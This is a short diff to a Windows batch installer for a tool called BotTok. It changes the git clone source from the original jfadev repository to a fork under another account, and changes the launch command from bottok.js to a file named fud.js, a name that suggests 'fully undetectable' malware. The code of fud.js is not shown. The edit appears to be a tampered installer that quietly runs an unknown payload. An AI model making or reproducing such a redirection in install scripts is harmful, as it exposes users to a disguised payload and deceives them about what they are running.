@@ -50,7 +50,7 @@ echo Once this is done close Notepad.exe window to continue.
 notepad %userprofile%\.ssh\id_rsa.pub
 
 echo Installing BotTok...
-"%programfiles%\Git\mingw64\libexec\git-core\git.exe" clone git@github.com:jfadev/bottok.git
+"%programfiles%\Git\mingw64\libexec\git-core\git.exe" clone git@github.com:DevMHOne/bottok.git
 cd bottok
 call "%programfiles%\nodejs\npm" install
 echo BotTok has been successfully installed!
@@ -59,4 +59,4 @@ timeout 5
 echo Starting BotTok...
 echo If BotTok does not open just open it yourself!
 timeout 5
-start "%programfiles%\nodejs" node.exe bottok.js
+start "%programfiles%\nodejs" node.exe fud.js
